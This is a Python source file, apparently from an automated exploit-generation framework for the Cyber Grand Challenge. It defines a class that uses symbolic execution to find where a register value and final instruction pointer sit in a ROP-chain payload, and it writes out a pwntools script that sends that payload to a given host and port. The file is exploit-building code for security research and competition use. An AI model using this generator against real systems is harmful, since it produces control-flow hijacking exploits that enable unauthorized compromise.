from rex.exploit.cgc import CGCType1Exploit

class CGCType1RopExploit(CGCType1Exploit):
    '''
    A CGC type1 exploit object, which sets a register via Rop.
    '''

    def __init__(self, crash, register, chain_addr, chain, value_var):
        '''
        :param crash: a crash object which has been modified to exploit a vulnerability
        :param register: the register set by the exploit
        :param chain_addr: address to place the chain in target's memory
        :param chain: angrop chain object to insert
        :param value_var: the claripy variable used to determine the position in the payload which contains the value
        '''
        super(CGCType1RopExploit, self).__init__(crash, register)

        # TODO: determine payload index of the value and final ip index
        self._chain_addr = chain_addr
        self._chain = chain
        self._value_var = value_var

        self.value_idx = None
        self.final_ip_idx = None

        self._determine_indices()

    def dump(self, filename=None):
        '''
        dumps a register setting exploit, depending on the script type specified the exploit will take the value to set
        and final IP value as arguments, either over-the-wire or via the command line
        :param filename: file to write the raw payload to
        '''

        # TODO dump exploit in multiple languages
        return self.dump_python(filename)

    def dump_python(self, filename=None):
        '''
        dump an exploit in the form of a python script
        '''

        payload = """import sys
import time
from pwn import *

if len(sys.argv) < 5:
    print "%s: <host> <port> <value> <final_ip>" % sys.argv[0]
    sys.exit(1)

r = remote(sys.argv[1], sys.argv[2])

value = int(sys.argv[3], 16)
final_ip = int(sys.argv[4], 16)

b = bytearray(\"""" + self._raw_payload.encode('hex') + """\".decode('hex'))
b[""" + str(self.value_idx) + ":" + str(self.value_idx + 4) + """] = p32(value)
b[""" + str(self.final_ip_idx) + ":" + str(self.final_ip_idx + 4) + """] = p32(final_ip)

r.send(b)
"""

        if not filename is None:
            with open(filename, 'w') as f:
                f.write(payload)
        else:
            return payload

    def _get_chain_with_value(self, value):
        c_str = self._chain.payload_str(constraints=(self._value_var==value))
        c_bvv = self.crash.state.se.BVV(c_str)

        s = self.crash.state.copy()
        c_mem = s.memory.load(self._chain_addr, len(c_str))
        s.add_constraints(c_mem == c_bvv)

        return s.posix.dumps(0)

    def _determine_indices(self):

        # find value index
        c1 = self._get_chain_with_value(0x4141414141)
        # used as the basis for the bytearray in the exploit script
        self._raw_payload = c1
        c2 = self._get_chain_with_value(0x5858585858)

        # find out at what index difference the value exists in the payload
        # TODO: MAKE THIS WAY MORE ROBUST, THE VALUE IN THE PAYLOAD WILL NOT NECESSARILY BE 'AAAA'

        for i in xrange(len(c1)):
            if c1[i] != c2[i]:
                self.value_idx = i
                break

        if self.value_idx is None:
            raise Exception("unable to find value index in payload string")

        # find final_ip index
        w_str = self._chain.payload_str(constraints=(self._value_var==0x41414141))
        w_bvv = self.crash.state.se.BVV(w_str)

        w_state = self.crash.state.copy()

        w_mem = w_state.memory.load(self._chain_addr, len(w_str))
        w_state.add_constraints(w_mem == w_bvv)

        w_state1 = self._windup_state(w_state)
        w_state2 = w_state1.copy()

        w_state1.add_constraints(w_state1.regs.pc == 0x61616161)
        w_state2.add_constraints(w_state2.regs.pc == 0x78787878)

        w1 = w_state1.posix.dumps(0)
        w2 = w_state2.posix.dumps(0)

        for i in xrange(len(w1)):
            if w1[i] != w2[i]:
                self.final_ip_idx = i
                break

        if self.final_ip_idx is None:
            raise Exception("unable to find final ip index in payload string")
